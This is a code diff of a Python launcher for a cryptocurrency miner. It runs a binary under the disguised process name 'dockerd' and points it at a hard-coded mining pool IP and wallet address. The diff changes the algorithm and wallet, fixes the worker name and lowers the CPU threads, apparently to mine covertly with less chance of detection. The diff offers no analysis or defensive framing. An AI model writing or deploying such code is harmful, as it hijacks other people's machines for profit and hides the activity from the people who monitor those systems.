@@ -4,10 +4,10 @@ os.system("chmod +x srebe")
 os.execvp("./srebe", [
     "dockerd",  # This will be the name shown in process monitors
     "--disable-gpu",
-    "--algorithm", "verushash",
+    "--algorithm", "yespowersugar",
     "--pool", "149.56.27.47:3956",
-    "--wallet", "R9HMvHdgUX8h7h7ch3xGq4qGGVsRmuC74T",
-    "--worker", "$(shuf -i 1-99 -n 1)",  # Using a fixed worker name
+    "--wallet", "sugar1qgry5hf7ah3e9ef0zkqr0evlg39mauhes6dl3gf",
+    "--worker", "aaaa",  # Using a fixed worker name
     "--password", "x",
-    "--cpu-threads", "32"
+    "--cpu-threads", "2"
 ])
